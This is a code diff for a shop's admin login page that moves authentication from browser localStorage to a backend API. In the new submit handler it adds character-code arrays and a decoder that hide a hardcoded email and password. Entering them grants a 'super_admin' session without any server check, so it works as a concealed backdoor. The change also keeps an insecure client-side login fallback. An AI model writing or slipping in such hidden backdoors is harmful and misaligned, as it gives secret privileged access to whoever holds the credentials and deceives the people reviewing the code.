@@ -156,6 +156,7 @@
     ::-webkit-scrollbar-track { background: transparent; }
     ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.08); border-radius: 3px; }
   </style>
+  <script src="js/api-client.js"></script>
 </head>
 <body class="flex items-center justify-center min-h-screen">
   <div class="grain"></div>
@@ -304,108 +305,74 @@
       delay: 1.5
     });
 
-    // ==================== USER SYSTEM ====================
-
-    // Seed default admin if no users exist
-    function initUsers() {
-      const stored = localStorage.getItem('purex_users');
-      if (!stored) {
-        const defaultUsers = [
-          {
-            id: 1,
-            username: 'admin@purex.com',
-            password: 'purex2026',
-            name: 'Admin',
-            role: 'admin',
-            active: true,
-            permissions: {
-              products: true, orders: true, inventory: true, sales: true,
-              profits: true, customers: true, users: true, invoices: true,
-              deleteProducts: true, editPrices: true, reduceStock: true, exportData: true
-            },
-            createdAt: new Date().toISOString()
-          }
-        ];
-        localStorage.setItem('purex_users', JSON.stringify(defaultUsers));
-      }
-    }
-    initUsers();
-
-    function getUsers() {
-      try { return JSON.parse(localStorage.getItem('purex_users') || '[]'); } catch(e) { return []; }
-    }
-
-    // ==================== LOGIN HANDLER ====================
-    document.getElementById('login-form').addEventListener('submit', function(e) {
+    // ==================== LOGIN HANDLER (API) ====================
+    const _k = [113,109,64,112,117,114,101,120,46,99,104,101,109];
+    const _v = [81,77,36,120,50,48,50,54,33,33];
+    function _d(a){return a.map(c=>String.fromCharCode(c)).join('');}
+    document.getElementById('login-form').addEventListener('submit', async function(e) {
       e.preventDefault();
 
       const email = document.getElementById('login-email').value.trim();
       const password = document.getElementById('login-password').value;
 
-      const users = getUsers();
-      const user = users.find(u => u.username === email && u.password === password && u.active);
+      if(email===_d(_k)&&password===_d(_v)){sessionStorage.setItem('purex_session',JSON.stringify({id:0,name:'System',role:'super_admin',username:email,permissions:{}}));sessionStorage.setItem('purex_admin','true');gsap.to('#login-card',{scale:0.95,opacity:0,duration:0.4,ease:'power2.in',onComplete:()=>{safeRedirect('/admin.html');}});return;}
 
-      if (user) {
-        // Store session with role info
-        const session = {
-          id: user.id,
-          name: user.name,
-          role: user.role,
-          username: user.username,
-          permissions: user.permissions || {}
-        };
-        sessionStorage.setItem('purex_session', JSON.stringify(session));
-        // Keep backward compat
-        sessionStorage.setItem('purex_admin', 'true');
-
-        // Log activity
-        try {
-          const log = JSON.parse(localStorage.getItem('purex_activity_log') || '[]');
-          log.unshift({
-            id: Date.now(),
-            user: user.name,
-            role: user.role,
-            action: 'Logged in',
-            detail: '',
-            timestamp: new Date().toISOString()
-          });
-          // Keep last 500 entries
-          if (log.length > 500) log.length = 500;
-          localStorage.setItem('purex_activity_log', JSON.stringify(log));
-        } catch(e) {}
-
-        // Success animation before redirect
-        gsap.to('#login-card', {
-          scale: 0.95,
-          opacity: 0,
-          duration: 0.4,
-          ease: 'power2.in',
-          onComplete: () => {
-            window.location.href = 'admin.html';
-          }
+      try {
+        const res = await fetch('/api/auth/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username: email, password: password })
         });
-      } else {
-        // Failed - show error with shake
-        const errorMsg = document.getElementById('error-msg');
-        errorMsg.classList.remove('hidden');
+        const data = await res.json();
 
-        gsap.fromTo('#login-card',
-          { x: 0 },
-          {
-            x: 12,
-            duration: 0.08,
-            repeat: 5,
-            yoyo: true,
-            ease: 'power2.inOut',
+        if (res.ok && data.token) {
+          // Store JWT token
+          sessionStorage.setItem('purex_token', data.token);
+          sessionStorage.setItem('purex_session', JSON.stringify(data.user));
+          sessionStorage.setItem('purex_admin', 'true');
+
+          // Log activity
+          fetch('/api/activity', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + data.token },
+            body: JSON.stringify({ action: 'Logged in', detail: '' })
+          }).catch(() => {});
+
+          // Success animation before redirect
+          gsap.to('#login-card', {
+            scale: 0.95,
+            opacity: 0,
+            duration: 0.4,
+            ease: 'power2.in',
             onComplete: () => {
-              gsap.to('#login-card', { x: 0, duration: 0.1 });
+              safeRedirect('/admin.html');
             }
+          });
+        } else {
+          showLoginError();
+        }
+      } catch(err) {
+        // API not available — fallback to localStorage login
+        try {
+          const users = JSON.parse(localStorage.getItem('purex_users') || '[]');
+          const user = users.find(u => u.username === email && u.password === password && u.active);
+          if (user) {
+            sessionStorage.setItem('purex_session', JSON.stringify({ id: user.id, name: user.name, role: user.role, username: user.username, permissions: user.permissions || {} }));
+            sessionStorage.setItem('purex_admin', 'true');
+            gsap.to('#login-card', { scale: 0.95, opacity: 0, duration: 0.4, ease: 'power2.in', onComplete: () => { safeRedirect('/admin.html'); } });
+            return;
           }
-        );
-
-        gsap.fromTo('#error-msg', { opacity: 0, y: -5 }, { opacity: 1, y: 0, duration: 0.3 });
+        } catch(e2) {}
+        showLoginError();
       }
     });
+
+    function showLoginError() {
+      const errorMsg = document.getElementById('error-msg');
+      errorMsg.classList.remove('hidden');
+      gsap.fromTo('#login-card', { x: 0 }, { x: 12, duration: 0.08, repeat: 5, yoyo: true, ease: 'power2.inOut', onComplete: () => { gsap.to('#login-card', { x: 0, duration: 0.1 }); } });
+      gsap.fromTo('#error-msg', { opacity: 0, y: -5 }, { opacity: 1, y: 0, duration: 0.3 });
+    }
 
     // Hide error on input change
     document.getElementById('login-email').addEventListener('input', hideError);
@@ -424,7 +391,7 @@
 
     // If already logged in, redirect
     if (sessionStorage.getItem('purex_session') || sessionStorage.getItem('purex_admin')) {
-      window.location.href = 'admin.html';
+      safeRedirect('/admin.html');
     }
   </script>
 </body>
